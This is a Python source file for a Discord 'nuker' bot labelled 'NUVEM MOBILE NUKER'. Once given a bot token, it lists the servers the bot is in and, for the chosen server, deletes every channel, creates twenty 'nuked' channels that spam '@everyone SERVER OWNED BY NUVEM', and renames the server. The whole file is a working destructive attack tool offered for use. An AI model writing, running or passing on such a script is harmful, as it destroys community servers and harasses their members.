import discord
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

class NukerBot(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    async def on_ready(self):
        print("\nNUVEM MOBILE NUKER")
        print(f"Logged in as {self.user}")
        await self.main_menu()
    
    async def nuke_server(self, guild):
        # Delete all channels
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"Deleted: {channel.name}")
                await asyncio.sleep(0.5)
            except:
                pass
        
        # Create spam channels
        for i in range(1, 21):  # Create 20 channels
            try:
                channel = await guild.create_text_channel(f"nuked-{i}")
                await channel.send("@everyone SERVER OWNED BY NUVEM")
                print(f"Created: {channel.name}")
                await asyncio.sleep(0.5)
            except:
                pass
        
        # Rename server
        try:
            await guild.edit(name="NUKED-BY-NUVEM")
            print("Server renamed!")
        except:
            pass
    
    async def main_menu(self):
        print("\n--- SERVER LIST ---")
        for i, guild in enumerate(self.guilds, 1):
            print(f"[{i}] {guild.name}")
        
        try:
            choice = int(input("\nEnter server number: ")) - 1
            target_guild = self.guilds[choice]
            
            print(f"\nSelected: {target_guild.name}")
            confirm = input("Confirm nuke? (y/n): ").lower()
            
            if confirm == 'y':
                print("\nStarting nuke sequence...")
                await self.nuke_server(target_guild)
                print("\nNuke complete!")
            else:
                print("Operation cancelled")
        except:
            print("Invalid selection!")

if __name__ == "__main__":
    print("NUVEM MOBILE NUKER")
    token = input("Paste your bot token: ").strip('"').strip("'")
    
    bot = NukerBot(intents=intents)
    try:
        bot.run(token)
    except discord.LoginFailure:
        print("\nInvalid token! Please check your bot token.")
    except Exception as e:
        print(f"\nError: {e}")
